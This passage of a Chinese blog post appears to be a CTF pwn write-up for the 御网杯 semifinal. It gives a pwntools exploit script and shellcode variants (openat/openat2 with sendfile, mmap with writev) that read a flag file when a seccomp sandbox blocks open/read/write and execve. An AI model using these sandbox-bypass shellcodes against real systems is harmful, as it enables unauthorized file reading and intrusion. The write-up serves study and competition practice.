class="n">x8d</span><span class="o">|</span><span class="err">$\</span><span class="n">x8c</span><span class="err">\</span><span class="n">xf3</span><span class="err">\</span><span class="n">xab</span><span class="err">\</span><span class="n">xc6</span><span class="err">\</span><span class="n">x03</span><span class="err">\</span><span class="n">x16</span><span class="err">\</span><span class="n">x8bD</span><span class="err">$</span><span class="mi">0</span><span class="n">D</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xf7</span><span class="err">\</span><span class="n">x89S</span><span class="err">\</span><span class="n">x04</span><span class="err">\</span><span class="n">xba</span><span class="err">\</span><span class="n">x01</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00L</span><span class="err">\</span><span class="n">x89</span><span class="p">{</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">xc7C</span><span class="err">\</span><span class="n">x18d</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">xc7D</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x8bD</span><span class="err">$\</span><span class="n">x1c</span><span class="err">\</span><span class="n">xffD</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">x00D</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe0</span><span class="err">\</span><span class="n">x0f</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">xb9</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00D</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe8H</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xdf</span><span class="err">\</span><span class="n">xba</span><span class="err">\</span><span class="n">x03</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">xf3</span><span class="err">\</span><span class="n">xabL</span><span class="err">\</span><span class="n">x89</span><span class="p">{</span><span class="err">\</span><span class="n">x10D</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xf7H</span><span class="err">\</span><span class="n">xb8</span><span class="err">\</span><span class="n">x17</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x01</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00H</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">x03</span><span class="err">\</span><span class="n">x8bD</span><span class="err">$</span><span class="mi">0</span><span class="err">\</span><span class="n">xc7C</span><span class="err">\</span><span class="n">x18d</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">xc7D</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x00</span><span class="err">\</span><span class="n">x8bD</span><span class="err">$\</span><span class="n">x1c</span><span class="err">\</span><span class="n">xffD</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">x00D</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe0</span><span class="err">\</span><span class="n">x0f</span><span class="err">\</span><span class="n">x05H</span><span class="err">\</span><span class="n">x83</span><span class="err">\</span><span class="n">xc4h1</span><span class="err">\</span><span class="n">xc0</span><span class="p">[]</span><span class="n">A</span><span class="err">\\</span><span class="n">A</span><span class="p">]</span><span class="n">A</span><span class="o">^</span><span class="n">A_</span><span class="err">\</span><span class="n">xc3</span><span class="p">.</span><span class="o">/</span><span class="n">flag</span><span class="err">'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="比赛例题">比赛例题</h2>

<h4 id="御网杯半决赛线下">御网杯半决赛线下</h4>

<p><img src="/assets/image/2025-08-01-my-second-post.assets/image-20250717222541764.png" alt="image-20250717222541764" /></p>

<p>虽然保护全开，但是mmap把写入地方的权限改成可读可写可执行了，问题就是沙盒把orw和execve全禁了</p>

<p><img src="/assets/image/2025-08-01-my-second-post.assets/image-20250717222830814.png" alt="image-20250717222830814" /></p>

<p>之前比赛一筹莫展，主要是积累函数太少了，可以用opennat,sendfile替代的</p>

<p>exp:</p>

<h5 id="用opennatsendfile替代">用opennat,sendfile替代</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">pwn</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./pwn</span><span class="sh">'</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="sh">'</span><span class="s">REMOTE</span><span class="sh">'</span><span class="p">]:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">192.168.18.22</span><span class="sh">'</span><span class="p">,</span> <span class="mi">8888</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#context.terminal = ['tmux','splitw','-h']
</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">pwn</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
<span class="n">inter</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

<span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xf7</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu32_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64_hex</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0x</span><span class="sh">'</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">uuu64</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uuuu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">target</span><span class="p">:</span> <span class="nf">u64</span><span class="p">((</span><span class="nf">ru</span><span class="p">(</span><span class="n">target</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">:]</span> <span class="o">+</span> <span class="nf">r</span><span class="p">(</span><span class="mi">5</span><span class="p">)).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="n">int16</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="s">%s -&gt; 0x%x</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_sb</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">get_orw</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">open</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">],</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">script</span><span class="o">=</span><span class="sa">f</span><span class="sh">''</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">b __call_tls_dtors</span><span class="sh">'</span>
    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">proc</span><span class="p">.</span><span class="nf">pidof</span><span class="p">(</span><span class="n">io</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="n">script</span><span class="p">)</span>
    <span class="nf">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">fmt</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">14</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hhn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">hn</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
    <span class="k">elif</span> <span class="n">size</span> <span class="o">==</span> <span class="sh">'</span><span class="s">n</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">value</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s">c%</span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">size</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="c1">#value 是格式化字符串偏移          
</span>    <span class="k">return</span> <span class="n">payload</span>

<span class="n">lss</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">cat_flag</span><span class="p">():</span>
    <span class="n">flag_header</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">flag{</span><span class="sh">'</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="n">flag_header</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag_header</span> <span class="o">+</span> <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span>
    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#debug()
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
 mov r12, 0x0067616c66 
 mov [rsp], r12
 xor rsi,rsi     
 xor r10, r10
 mov rdi, -100
 mov rsi, rsp
 mov rdx, 0
 mov rax,0x101
 syscall
 mov rdi, 1
 mov rsi, rax
 mov rdx, 0
 mov r10, 0x100
 mov rax, 0x28
 syscall
</span><span class="sh">'''</span>

<span class="nf">sl</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>


<span class="nf">inter</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="用opennat2sendfile替代的">用opennat2，sendfile替代的</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
mov r12, 0x0067616c66
mov [rsp], r12

xor rax, rax
push rax
push rax
push rax
push rax

mov rdi, -100       
lea rsi, [rsp+0x20]  
mov rdx, rsp         
mov r10, 0x18        
mov rax, 437        
syscall
mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 0x100
mov rax, 0x28
syscall
</span><span class="sh">'''</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="用mmapwritev替代的">用mmap，writev替代的</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="n">shellcode</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
mov r12, 0x0067616c66
mov [rsp], r12

xor rax, rax
push rax
push rax
push rax
push rax

mov rdi, -100       
lea rsi, [rsp+0x20]  
mov rdx, rsp         
mov r10, 0x18        
mov rax, 437        
syscall
mov rdi, 0x777721000
mov rsi, 0x100
mov rdx, 1
mov r10, 2
mov r8, 3
mov r9, 0
mov rax, 9
syscall
mov rbx, 0x777721000     
mov rcx, 0x100         
sub rsp, 0x20
mov [rsp], rbx
mov [rsp + 8], rcx
mov rdi, 1              
mov rsi, rsp           
mov rdx, 1               
mov rax, 0x14            
syscall
</span><span class="sh">'''</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>一直在学习大佬的路上
转载作者原文 https://www.cnblogs.com/xmiscx/p/18827064</p>



    <div class="share" style="margin-bottom: 3rem;">
  
</div>

<div class="post-navigation-wrapper">
  
  
  <a href="/%E6%8A%80%E6%9C%AF/2025/06/16/my-first-post/" class="nav-card prev">
    <div class="nav-label">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
      上一篇
    </div>
    <div class="nav-title">我的第一篇博客</div>
  </a>
  

  
  <a href="/%E6%8A%80%E6%9C%AF/2025/11/23/IOstudy/" class="nav-card next">
    <div class="nav-label">
      下一篇
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
    </div>
    <div class="nav-title">heap的IO链学习</div>
  </a>
  

</div>


    


  </article>

  

</main>

<footer class="footer">
  <div class="container">
    <div class="copyright  typeset">
      <small class="small">&copy; Liyck的技术博客 2025</small>
    </div>

    
  <nav class="nav">
  <ul class="list list--nav">
    
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/about/">关于</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/categories/">所有分类</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/elements/">Elements</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            
            <a href="/blog/"></a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/">二进制手的技术博客</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/offline/">Looks like you're offline</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/projects/">项目</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/search/">搜索</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/thanks/">Thanks!</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/tags/jekyll/">Jekyll</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/tags/markdown/">Markdown</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
          
        </li>
      
    
      
        <li class="item  item--nav">

          

          
            <a href="/categories/e68a80e69caf/">技术</a>
          
        </li>
      
    
  </ul>
</nav>



  </div>
</footer>



    <script type="text/javascript">
(() => {
  const registerServiceWorker = () => {
    if (!navigator.serviceWorker) {
      return;
    }

    navigator.serviceWorker
      .register("/sw.js")
      .then(registration => {
        console.log("Service Worker: registered");
      })
      .catch(err => {
        console.log("Service Worker: registration failed ", err);
      });
  };

  registerServiceWorker();
})();
</script>


    <!-- 阅读进度条脚本（放这里是正确的） -->
<script>
document.addEventListener("scroll", function () {
  const docHeight = document.documentElement.scrollHeight - window.innerHeight;
  const scrollTop = document.documentElement.scrollTop;
  const progress = (scrollTop / docHeight) * 100;

  const bar = document.getElementById("reading-progress");
  if (bar) {
    bar.style.width = progress + "%";
  }
});
</script>

    
    <div id="reading-progress"></div>
<button id="back-to-top" title="回到顶部 🚀">
  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
    <circle cx="12" cy="12" r="11" fill="#ffffff" stroke="#10b981" stroke-width="2"/>
    <path d="M15 14L12 11L9 14" stroke="#10b981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
    <path d="M12 11V18" stroke="#10b981" stroke-width="2.5" stroke-linecap="round"/>
  </svg>
</button>

  </body>

</html>
